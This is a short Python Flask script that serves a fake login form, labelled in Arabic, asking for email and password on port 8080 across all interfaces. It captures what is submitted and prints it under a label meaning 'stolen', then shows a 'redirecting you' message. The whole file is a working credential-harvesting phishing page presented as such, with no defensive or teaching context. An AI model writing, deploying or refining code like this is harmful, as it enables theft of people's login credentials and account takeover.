from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["password"]
        print(f"تمت السرقة: {email} - {password}")
        return "جاري تحويلك..."

    return '''
    <form method="post">
        الإيميل: <input name="email"><br>
        كلمة السر: <input name="password"><br>
        <input type="submit" value="تسجيل الدخول">
    </form>
    '''

app.run(host="0.0.0.0", port=8080)
